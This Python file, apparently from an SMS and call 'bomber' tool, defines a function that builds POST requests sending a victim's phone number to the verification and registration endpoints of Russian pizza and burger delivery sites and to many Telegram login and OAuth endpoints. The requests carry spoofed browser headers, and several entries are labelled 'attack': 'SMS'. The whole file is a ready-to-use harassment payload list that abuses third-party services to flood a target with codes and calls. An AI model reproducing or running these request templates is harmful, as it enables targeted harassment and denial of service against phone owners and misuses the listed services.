from Core.Email import email
from Core.User_Agent import user_agent
from Core.Username import username

def get_Urls(number):
    urls = [
        {
            "method": "post",
            "url": "https://ninjapizza.ru/api/user/register",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "accept-language": "ru,en;q=0.9",
                "content-type": "application/json;charset=UTF-8",
                "cookie": "",
                "origin": "https://ninjapizza.ru",
                "priority": "u=1, i",
                "referer": "https://ninjapizza.ru/krasnoyarsk",
                "sec-ch-ua": "\"Chromium\";v=\"130\", \"YaBrowser\";v=\"24.12\", \"Not?A_Brand\";v=\"99\", \"Yowser\";v=\"2.5\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sitenew": "1",
                "user-agent": user_agent(),
                "uuid": "285bcc8d-6e09-542e-d499-93a668e98356",
                "x-api-key": "7416189",
                "x-brand-id": "1"
            },
            "json": {
                "phone": f"{number}",
                "verify_type": "call"
            }
        },
        {
            "method": "post",
            "url": "https://dodopizza.ru/api/sendconfirmationcode",
            "headers": {
                "accept": "*/*",
                "accept-language": "ru,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "cookie": "",
                "origin": "https://dodopizza.ru",
                "priority": "u=1, i",
                "referer": "https://dodopizza.ru/krasnoyarsk",
                "sec-ch-ua": "\"Chromium\";v=\"130\", \"YaBrowser\";v=\"24.12\", \"Not?A_Brand\";v=\"99\", \"Yowser\";v=\"2.5\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": user_agent(),
                "x-requested-with": "XMLHttpRequest"
            },
            "data": {
                "phoneNumber": f"+{number}"
            }
        },
        {
            "method": "post",
            "url": "https://api2.ls.net.ru/apix/v2/auth/register",
            "headers": {
                "accept": "*/*",
                "accept-language": "ru,en;q=0.9",
                "authorization": "",
                "content-type": "application/json",
                "cookie": "",
                "origin": "https://ls.net.ru",
                "priority": "u=1, i",
                "referer": "https://ls.net.ru/",
                "sec-ch-ua": "\"Chromium\";v=\"130\", \"YaBrowser\";v=\"24.12\", \"Not?A_Brand\";v=\"99\", \"Yowser\";v=\"2.5\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": user_agent(),
                "x-platform": "web",
                "x-support-webp": "1"
            },
            "json": {
                "phone_number": f"+{number}"
            }
        },
        {
            "method": "post",
            "url": "https://magic-burger.ru/api/user/register",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "accept-language": "ru,en;q=0.9",
                "content-type": "application/json;charset=UTF-8",
                "cookie": "",
                "origin": "https://magic-burger.ru",
                "priority": "u=1, i",
                "referer": "https://magic-burger.ru/krsk",
                "sec-ch-ua": "\"Chromium\";v=\"130\", \"YaBrowser\";v=\"24.12\", \"Not?A_Brand\";v=\"99\", \"Yowser\";v=\"2.5\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sitenew": "1",
                "user-agent": user_agent(),
                "uuid": "0f3b8b5b-ab3d-d03f-6440-49a4fccb004c",
                "x-api-key": "1828552",
                "x-brand-id": "1"
            },
            "json": {
                "phone": f"{number}",
                "verify_type": "call"
            }
        },
        {
            "method": "post",
            "url": "https://my.telegram.org/auth/send_password",
            "headers": {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "accept-language": "ru,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://my.telegram.org",
                "priority": "u=1, i",
                "referer": "https://my.telegram.org/auth",
                "sec-ch-ua": "\"Chromium\";v=\"130\", \"YaBrowser\";v=\"24.12\", \"Not?A_Brand\";v=\"99\", \"Yowser\";v=\"2.5\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": user_agent(),
                "x-requested-with": "XMLHttpRequest"
            },
            "data": {
                "phone": f"+{number}"
            }
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'My.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://my.telegram.org/auth/send_password',
            'headers': user_agent()[0],
            'data': {'phone': '7' + number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            'headers': user_agent()[0],
            'data': {'phone': '7' + number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=535136360&origin=https%3A%2F%2Ftestwidgetbot.herokuapp.com&embed=1&request_access=write&return_to=https%3A%2F%2Ftestwidgetbot.herokuapp.com%2F',
            'headers': user_agent()[0],
            'data': {'phone': '7' + number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2Fblog%2Fru%2Fvoiti-cherez-telegram-avtorizatsiia-na-saitie-botobot%2F',
            'headers': user_agent()[0],
            'data': {'phone': '7' + number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
            'headers': user_agent()[0],
            'data': {'phone': '7' + number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
            'headers': user_agent()[0],
            'data': {'phone': '7' + number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
            'headers': user_agent()[0],
            'data': {'phone': '7' + number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=883734075&origin=https%3A%2F%2Fconsole.bot4shop.com&embed=1&request_access=write&return_to=https%3A%2F%2Fconsole.bot4shop.com%2Flogin.html',
            'headers': user_agent()[0],
            'data': {'phone': '7' + number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=5305587912&origin=http%3A%2F%2Febot.one&embed=1&request_access=write&return_to=http%3A%2F%2Febot.one%2Fall%2Fs_radoid%2Fdialogs%2Fdialogs.php%3Flng%3Drus',
            'headers': user_agent()[0],
            'data': {'phone': '7' + number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1434478353&origin=https%3A%2F%2Frobochat.io&embed=1&request_access=write&return_to=https%3A%2F%2Frobochat.io%2Fjoin%2F',
            'headers': user_agent()[0],
            'data': {'phone': '7' + number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'headers': user_agent()[0],
            'data': {'phone': '7' + number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1012878451&origin=https%3A%2F%2Funu.im&embed=1&request_access=write&return_to=https%3A%2F%2Funu.im%2Faccount%2Fregauth%2Ftelegram',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
            'headers': user_agent()[0],
            'data': {'phone': '7' + number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
            'headers': user_agent()[0],
            'data': {'phone': '7' + number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'headers': user_agent()[0],
            'data': {'phone': '7' + number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'headers': user_agent()[0],
            'data': {'phone': '7' + number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Translations.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://translations.telegram.org/auth/request',
            'headers': {'authority': 'translations.telegram.org',
                        'accept': 'application/json, text/javascript, */*; q=0.01',
                        'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'cookie': 'stel_ssid=1300d252ca70bf2993_8438304871264084382; stel_lang=en; stel_dt=-300',
                        'origin': 'https://translations.telegram.org', 'referer': 'https://translations.telegram.org/',
                        'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"',
                        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],
                        'x-requested-with': 'XMLHttpRequest', },
            'data': {'phone': '7' + number, },
        },
    ]

    return urls